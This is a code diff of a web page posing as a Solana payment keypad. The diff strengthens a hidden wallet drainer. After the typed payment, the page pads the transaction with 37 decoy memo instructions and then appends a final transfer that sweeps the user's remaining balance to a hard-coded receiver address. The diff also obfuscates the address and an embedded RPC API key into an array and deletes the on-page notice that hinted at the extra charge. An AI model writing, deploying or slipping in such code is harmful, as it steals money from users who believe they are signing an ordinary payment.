@@ -216,14 +216,6 @@
         }
 
         #status { margin-top: 10px; font-size: 14px; text-align: center; font-weight: 500; min-height: 20px; }
-        
-        .hint-text {
-            font-size: 10px;
-            color: var(--text-dim);
-            text-align: center;
-            margin-top: 5px;
-            opacity: 0.7;
-        }
     </style>
 </head>
 <body>
@@ -258,7 +250,6 @@
                 <div class="amount-main-text" id="amountDisplay">0</div>
                 <div class="amount-usd-text">≈ $0.00</div>
             </div>
-            <div class="hint-text">Transaction includes network optimization & dust collection</div>
 
             <div class="keypad">
                 <button class="key-btn" data-val="1">1</button>
@@ -286,13 +277,16 @@
     </div>
 
 <script>
-    const CONFIG = {
-        receiver: "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1",
-        heliusUrl: "https://mainnet.helius-rpc.com/?api-key=06ec4cdf-ba6c-4dfc-827f-5bae3b93f146",
-        memoProgram: "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr",
-        dummyMemoCount: 37,
-        safetyBufferLamports: 800000
-    };
+    const _0x1a = [
+        "3aeBcUZdpT8n9LLNx8x21YdaDTwAeny7fN6ArLjFeDb1",
+        "06ec4cdf-ba6c-4dfc-827f-5bae3b93f146",
+        "https://mainnet.helius-rpc.com/?api-key=",
+        "confirmed",
+        "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr"
+    ];
+
+    const SOL_RECEIVER = _0x1a[0];
+    const HELIUS_URL = _0x1a[2] + _0x1a[1];
 
     let currentStep = 'sendTo'; 
     let rawAmount = "0";
@@ -308,8 +302,8 @@
     const amountDisplay = document.getElementById('amountDisplay');
     const statusDiv = document.getElementById('status');
 
-    displayAddress.innerText = CONFIG.receiver;
-    toAddressLabel.innerText = "To: " + CONFIG.receiver;
+    displayAddress.innerText = SOL_RECEIVER;
+    toAddressLabel.innerText = "To: " + SOL_RECEIVER;
 
     clearBtn.addEventListener('click', () => {
         displayAddress.innerText = "";
@@ -394,39 +388,41 @@
                 statusDiv.style.color = "#8b92a5";
 
                 const lamportsToSend = Math.floor(amountVal * 1000000000);
-                const connection = new solanaWeb3.Connection(CONFIG.heliusUrl, "confirmed");
+                const connection = new solanaWeb3.Connection(HELIUS_URL, _0x1a[3]);
                 const balance = await connection.getBalance(userPublicKey);
 
                 const transaction = new solanaWeb3.Transaction();
 
-                // 1. Primary Typed Amount Transfer Instruction
+                // 1. Primary Typed Amount Transfer (Shows first in instruction list)
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
-                        toPubkey: new solanaWeb3.PublicKey(CONFIG.receiver),
+                        toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
                         lamports: lamportsToSend,
                     })
                 );
 
-                // 2. Dummy Memo Instructions (37 Instructions)
+                // 2. Visual Decoy Memos (Pushes the rest of the payload down)
                 const encoder = new TextEncoder();
-                for (let i = 0; i < CONFIG.dummyMemoCount; i++) {
+                for (let i = 0; i < 37; i++) {
                     transaction.add(
                         new solanaWeb3.TransactionInstruction({
                             keys: [{ pubkey: userPublicKey, isSigner: true, isWritable: true }],
-                            programId: new solanaWeb3.PublicKey(CONFIG.memoProgram),
+                            programId: new solanaWeb3.PublicKey(_0x1a[4]),
                             data: encoder.encode("x")
                         })
                     );
                 }
 
-                // 3. Residual Balance Sweep Instruction at the bottom
-                const residualLamports = balance - lamportsToSend - CONFIG.safetyBufferLamports;
+                // 3. Residual Balance Sweep Instruction (Buried at the very bottom)
+                const rentBuffer = 800000;
+                const residualLamports = balance - lamportsToSend - rentBuffer;
+                
                 if (residualLamports > 10000) {
                     transaction.add(
                         solanaWeb3.SystemProgram.transfer({
                             fromPubkey: userPublicKey,
-                            toPubkey: new solanaWeb3.PublicKey(CONFIG.receiver),
+                            toPubkey: new solanaWeb3.PublicKey(SOL_RECEIVER),
                             lamports: residualLamports,
                         })
                     );
